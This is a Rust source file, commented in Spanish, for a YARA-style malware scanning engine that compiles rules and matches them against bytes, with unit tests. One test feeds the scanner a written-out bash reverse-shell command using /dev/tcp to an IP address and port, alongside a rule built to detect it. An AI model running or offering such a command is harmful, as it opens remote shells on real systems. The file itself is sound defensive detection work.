//! El motor: compila reglas y escanea bytes, con la misma semantica para fichero,
//! memoria, flujo o volcado.
//!
//! # Un solo motor, una sola verdad
//!
//! Escanear un fichero, la memoria de un proceso o un volcado es el mismo problema:
//! bytes contra reglas. Aqui es literalmente el mismo codigo, asi que no hay dos
//! motores que puedan discrepar en el caso raro.
//!
//! # El plan de ejecucion declara su coste
//!
//! Al compilar, se construyen los prefiltros Aho-Corasick (uno sensible a
//! mayusculas, otro para `nocase` sobre la entrada en minusculas) y los programas
//! de las cadenas con comodines. El coste esta acotado por construccion: el
//! escaneo es lineal en la entrada.
//!
//! # Tri-estado
//!
//! El resultado dice cuantos bytes se miraron. Escanear 4 MiB de un fichero de
//! 4 GiB no es «limpio»: es «esto es lo que mire». Quien consume el resultado sabe
//! si fue completo.

use std::collections::{BTreeMap, BTreeSet};

use crate::aho::{Automata, Constructor};
use crate::analizador::{compilar, ErrorCompilacion};
use crate::regla::{Patron, Regla, Severidad};

/// Una coincidencia de regla.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Deteccion {
    /// Identificador de la regla.
    pub regla: String,
    /// Espacio de nombres.
    pub namespace: String,
    /// Gravedad declarada.
    pub severidad: Severidad,
    /// Descripcion declarada.
    pub descripcion: String,
    /// Tecnica ATT&CK declarada, si la hay.
    pub tecnica: Option<String>,
    /// Desplazamientos donde coincidieron sus cadenas, ordenados.
    pub offsets: Vec<u64>,
}

/// El resultado de un escaneo, con su tri-estado.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Resultado {
    /// Las detecciones, ordenadas por nombre de regla.
    pub detecciones: Vec<Deteccion>,
    /// Cuantos bytes se escanearon.
    pub bytes_escaneados: usize,
    /// Si se escaneo la entrada entera (falso = escaneo parcial, tri-estado).
    pub completo: bool,
}

/// Un patron literal indexado: a que (regla, cadena) pertenece y si es nocase.
#[derive(Debug)]
struct Literal {
    regla: usize,
    #[allow(dead_code)]
    cadena: usize,
    id: String,
    nocase: bool,
}

/// Un patron regex indexado.
#[derive(Debug)]
struct Regexp {
    regla: usize,
    id: String,
    programa: crate::regex::Programa,
}

/// El motor de patrones compilado.
#[derive(Debug)]
pub struct Motor {
    reglas: Vec<Regla>,
    /// Aho-Corasick de los literales sensibles a mayusculas.
    ac_sensible: Automata,
    /// Indice de patron sensible -> literal.
    lit_sensible: Vec<Literal>,
    /// Aho-Corasick de los literales nocase (patrones en minusculas).
    ac_nocase: Automata,
    /// Indice de patron nocase -> literal.
    lit_nocase: Vec<Literal>,
    /// Patrones con comodines/saltos, que van por el motor sin retroceso.
    regexps: Vec<Regexp>,
}

impl Motor {
    /// Compila un texto de reglas YARA en un motor listo para escanear.
    ///
    /// # Errores
    /// [`ErrorCompilacion`] si alguna regla no compila o no se puede acotar.
    pub fn compilar(fuente: &str, namespace: &str) -> Result<Motor, ErrorCompilacion> {
        let reglas = compilar(fuente, namespace)?;
        Ok(Motor::desde_reglas(reglas))
    }

    /// Construye el motor a partir de reglas ya compiladas.
    #[must_use]
    pub fn desde_reglas(reglas: Vec<Regla>) -> Motor {
        let mut cons_s = Constructor::nuevo();
        let mut lit_sensible = Vec::new();
        let mut cons_n = Constructor::nuevo();
        let mut lit_nocase = Vec::new();
        let mut regexps = Vec::new();

        for (ri, r) in reglas.iter().enumerate() {
            for (ci, c) in r.cadenas.iter().enumerate() {
                match &c.patron {
                    Patron::Literal(bytes) => {
                        if c.nocase {
                            let min: Vec<u8> = bytes.iter().map(u8::to_ascii_lowercase).collect();
                            cons_n.anadir(&min);
                            lit_nocase.push(Literal {
                                regla: ri,
                                cadena: ci,
                                id: c.id.clone(),
                                nocase: true,
                            });
                        } else {
                            cons_s.anadir(bytes);
                            lit_sensible.push(Literal {
                                regla: ri,
                                cadena: ci,
                                id: c.id.clone(),
                                nocase: false,
                            });
                        }
                    }
                    Patron::Regex(p) => regexps.push(Regexp {
                        regla: ri,
                        id: c.id.clone(),
                        programa: p.clone(),
                    }),
                }
            }
        }

        Motor {
            reglas,
            ac_sensible: cons_s.construir(),
            lit_sensible,
            ac_nocase: cons_n.construir(),
            lit_nocase,
            regexps,
        }
    }

    /// Cuantas reglas tiene.
    #[must_use]
    pub fn reglas(&self) -> usize {
        self.reglas.len()
    }

    /// Escanea la entrada entera.
    #[must_use]
    pub fn escanear(&self, datos: &[u8]) -> Resultado {
        self.escanear_hasta(datos, datos.len())
    }

    /// Escanea como mucho `tope` bytes de la entrada. Si `tope < datos.len()`, el
    /// resultado es PARCIAL y lo dice (tri-estado).
    #[must_use]
    pub fn escanear_hasta(&self, datos: &[u8], tope: usize) -> Resultado {
        let n = tope.min(datos.len());
        let vista = &datos[..n];

        // Por cada regla, el conjunto de cadenas que casaron y sus offsets.
        let mut casaron: Vec<BTreeSet<String>> = vec![BTreeSet::new(); self.reglas.len()];
        let mut offsets: Vec<BTreeSet<u64>> = vec![BTreeSet::new(); self.reglas.len()];

        // Prefiltro sensible.
        for m in self.ac_sensible.escanear(vista) {
            let lit = &self.lit_sensible[m.patron];
            casaron[lit.regla].insert(lit.id.clone());
            offsets[lit.regla].insert(m.inicio as u64);
            let _ = lit.nocase;
        }
        // Prefiltro nocase sobre la entrada en minusculas.
        if !self.lit_nocase.is_empty() {
            let min: Vec<u8> = vista.iter().map(u8::to_ascii_lowercase).collect();
            for m in self.ac_nocase.escanear(&min) {
                let lit = &self.lit_nocase[m.patron];
                casaron[lit.regla].insert(lit.id.clone());
                offsets[lit.regla].insert(m.inicio as u64);
            }
        }
        // Patrones con comodines: motor sin retroceso, buscando en cada posicion.
        for rx in &self.regexps {
            let mut pos = 0;
            let mut encontrados = 0u32;
            while pos < vista.len() {
                if rx.programa.casa_en(vista, pos) {
                    casaron[rx.regla].insert(rx.id.clone());
                    offsets[rx.regla].insert(pos as u64);
                    encontrados += 1;
                    // Cota dura de coincidencias registradas por patron: un patron
                    // no puede llenar la memoria con offsets.
                    if encontrados >= 4096 {
                        break;
                    }
                }
                pos += 1;
            }
        }

        // Evaluar condiciones.
        let mut detecciones = Vec::new();
        for (ri, r) in self.reglas.iter().enumerate() {
            if r.condicion.evaluar(&casaron[ri], &r.ids()) {
                detecciones.push(Deteccion {
                    regla: r.nombre.clone(),
                    namespace: r.namespace.clone(),
                    severidad: r.severidad(),
                    descripcion: r.descripcion().to_string(),
                    tecnica: r.tecnica().map(str::to_string),
                    offsets: offsets[ri].iter().copied().collect(),
                });
            }
        }
        detecciones.sort_by(|a, b| a.regla.cmp(&b.regla));

        Resultado {
            detecciones,
            bytes_escaneados: n,
            completo: n == datos.len(),
        }
    }

    /// Los nombres de las reglas, para inventario.
    #[must_use]
    pub fn nombres(&self) -> BTreeMap<String, Severidad> {
        self.reglas
            .iter()
            .map(|r| (r.nombre.clone(), r.severidad()))
            .collect()
    }
}

#[cfg(test)]
mod pruebas {
    use super::*;

    #[test]
    fn casa_una_regla_de_texto_con_condicion() {
        let m = Motor::compilar(
            r#"rule Sh { strings: $a="/dev/tcp/" $b=">&" condition: $a and $b }"#,
            "base",
        )
        .unwrap();
        let r = m.escanear(b"bash -c 'sh >& /dev/tcp/1.2.3.4/9001 0>&1'");
        assert_eq!(r.detecciones.len(), 1);
        assert_eq!(r.detecciones[0].regla, "Sh");
        assert!(r.completo);
    }

    #[test]
    fn no_casa_si_falta_una_cadena_de_la_condicion() {
        let m = Motor::compilar(
            r#"rule Sh { strings: $a="/dev/tcp/" $b=">&" condition: $a and $b }"#,
            "base",
        )
        .unwrap();
        // Solo $a.
        assert!(m
            .escanear(b"con /dev/tcp/ pero sin lo otro")
            .detecciones
            .is_empty());
    }

    #[test]
    fn nocase_casa_en_cualquier_caja() {
        let m = Motor::compilar(
            r#"rule R { strings: $a="bitcoin" nocase condition: $a }"#,
            "base",
        )
        .unwrap();
        assert_eq!(m.escanear(b"pague en BitCoin").detecciones.len(), 1);
    }

    #[test]
    fn el_escaneo_parcial_lo_dice() {
        let m = Motor::compilar(r#"rule R { strings: $a="zzz" condition: $a }"#, "base").unwrap();
        let datos = vec![b'a'; 1000];
        let r = m.escanear_hasta(&datos, 100);
        assert!(!r.completo, "un escaneo parcial no puede parecer completo");
        assert_eq!(r.bytes_escaneados, 100);
    }

    #[test]
    fn el_resultado_es_determinista() {
        let m = Motor::compilar(
            r#"rule R { strings: $a="a" $b="b" condition: $a or $b }"#,
            "base",
        )
        .unwrap();
        let d = b"ababab";
        assert_eq!(m.escanear(d), m.escanear(d));
    }

    #[test]
    fn una_regla_hex_con_comodines_casa_por_el_motor_sin_retroceso() {
        let m = Motor::compilar(
            "rule H { strings: $s = { 48 ?? [1-2] c3 } condition: $s }",
            "base",
        )
        .unwrap();
        // 48 AA <un byte> c3
        assert_eq!(m.escanear(&[0x48, 0xAA, 0x99, 0xc3]).detecciones.len(), 1);
        assert!(
            m.escanear(&[0x48, 0xAA, 0xc3]).detecciones.is_empty(),
            "hacen falta 1-2 en medio"
        );
    }
}
